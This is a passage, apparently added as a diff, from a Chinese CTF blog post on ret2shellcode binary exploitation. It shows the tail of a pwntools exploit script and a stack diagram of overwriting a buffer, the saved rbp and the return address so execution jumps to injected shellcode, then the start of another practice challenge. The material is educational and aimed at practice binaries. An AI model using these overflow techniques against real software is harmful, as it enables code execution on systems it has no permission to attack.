rbp)+8(返回地址)=buf_addr+32（0x10=16，16+8+8=32）</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">程序栈帧结构：</span><br><span class="line">高地址</span><br><span class="line">+---------------------------+</span><br><span class="line">|  其他函数栈帧/环境变量        |</span><br><span class="line">+---------------------------+</span><br><span class="line">|  saved rbp (旧rbp值)       |  ← rbp 原始位置（占8字节，x64下）</span><br><span class="line">+---------------------------+</span><br><span class="line">|  buf (用户输入缓冲区)        |  ← 大小 0x10（16字节）</span><br><span class="line">+---------------------------+</span><br><span class="line">|  栈底/低地址                |</span><br><span class="line">→→</span><br><span class="line">高地址</span><br><span class="line">+---------------------------+</span><br><span class="line">|  A*0x10 (buf)             |</span><br><span class="line">+---------------------------+</span><br><span class="line">|  A*8 (saved rbp)          |</span><br><span class="line">+---------------------------+</span><br><span class="line">|  p64(目标地址)              |  ← 返回地址：程序执行完当前函数后，跳转到这里</span><br><span class="line">+---------------------------+</span><br><span class="line">|  shellcode                |  ← 实际要执行的恶意代码</span><br><span class="line">+---------------------------+</span><br><span class="line">|  低地址                    |</span><br></pre></td></tr></table></figure>
+
+<h2 id="例六"><a href="#例六" class="headerlink" title="例六"></a>例六</h2><blockquote>
+<p>点击下载: <a href="../../../../../../../challeges/show_shellcode">show_shellcode</a></p>
+</blockquote>
+<p>Checksec 查看保护</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://rhea006.github.io">Rhea</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://rhea006.github.io/2025/07/bb0d09949d55.html">https://rhea006.github.io/2025/07/bb0d09949d55.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://rhea006.github.io" target="_blank">Rhea's Blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/w7.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/07/b470f1e84375.html" title="1-ret2text"><img class="cover" src="/img/w2.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">1-ret2text</div></div><div class="info-2"><div class="info-item-1">随着 NX (Non-eXecutable) 保护的开启，传统的直接向栈或者堆上直接注入代码的方式难以继续发挥效果，由此攻击者们也提出来相应的方法来绕过保护。 目前被广泛使用的攻击手法是 返回导向编程 (Return Oriented Programming)，其主要思想是在 栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。 gadgets 通常是以 ret 结尾的指令序列，通过这样的指令序列，我们可以多次劫持程序控制流，从而运行特定的指令序列，以完成攻击的目的。 返回导向编程这一名称的由来是因为其核心在于利用了指令集中的 ret 指令，从而改变了指令流的执行顺序，并通过数条 gadget “执行” 了一个新的程序。 使用 ROP 攻击一般得满足如下条件：  程序漏洞允许我们劫持控制流，并控制后续的返回地址。 可以找到满足条件的 gadgets 以及相应 gadgets 的地址。  作为一项基本的攻击手段，ROP 攻击并不局限于栈溢出漏洞，也被广泛应用在堆溢出等各类漏洞的利用当中。 需要注意的是，现代操作系统...</div></div></div></a><a class="pagination-related" href="/2025/07/e95b91c59fd3.html" title=""><img class="cover" src="/img/w6.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2"></div></div><div class="info-2"><div class="info-item-1">title: 可执行文件装载与虚拟内存date: 2025-06-28 20:16:36categories:   - PWN -ELF文件格式 tags:     </div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2shellcode"><span class="toc-number">1.</span> <span class="toc-text">ret2shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.2.</span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.2.1.</span> <span class="toc-text">第一种利用方式:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B1"><span class="toc-number">1.3.</span> <span class="toc-text">例1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B2"><span class="toc-number">1.4.</span> <span class="toc-text">例2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B3"><span class="toc-number">1.5.</span> <span class="toc-text">例3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B4"><span class="toc-number">1.6.</span> <span class="toc-text">例4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E4%BA%94"><span class="toc-number">1.7.</span> <span class="toc-text">例五</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E5%85%AD"><span class="toc-number">1.8.</span> <span class="toc-text">例六</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url(/img/w7.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By Rhea</span></div><div class="footer_custom_text">Hi,welocome to my blog!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'
+
+  const createScriptElement = config => {
+    const ele = document.createElement('script')
+    Object.entries(config).forEach(([key, value]) => {
+      ele.setAttribute(key, value)
+    })
+    return ele
+  }
+
+  const loadGiscus = (el = document, key) => {
+    const mappingConfig = isShuoshuo
+      ? { 'data-mapping': 'specific', 'data-term': key }
+      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }
+
+    const giscusConfig = {
+      src: 'https://giscus.app/client.js',
+      'data-repo': 'Rhea006/rhea006.github.io',
+      'data-repo-id': 'R_kgDOO6e8Gw',
+      'data-category-id': 'DIC_kwDOO6e8G84CtK5G',
+      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
+      'data-reactions-enabled': '1',
+      crossorigin: 'anonymous',
+      async: true,
+      ...option,
+      ...mappingConfig
+    }
+
+    const scriptElement = createScriptElement(giscusConfig)
+
+    el.querySelector('#giscus-wrap').appendChild(scriptElement)
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGiscus = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const changeGiscusTheme = theme => {
+    const iframe = document.querySelector('#giscus-wrap iframe')
+    if (iframe) {
+      const message = {
+        giscus: {
+          setConfig: {
+            theme: getGiscusTheme(theme)
+          }
+        }
+      }
+      iframe.contentWindow.postMessage(message, 'https://giscus.app')
+    }
+  }
+
+  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')
+
+  if (isShuoshuo) {
+    'Giscus' === 'Giscus'
+      ? window.shuoshuoComment = { loadComment: loadGiscus }
+      : window.loadOtherComment = loadGiscus
+    return
+  }
+
+  if ('Giscus' === 'Giscus' || !false) {
+    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
+    else loadGiscus()
+  } else {
+    window.loadOtherComment = loadGiscus
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="search..." type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
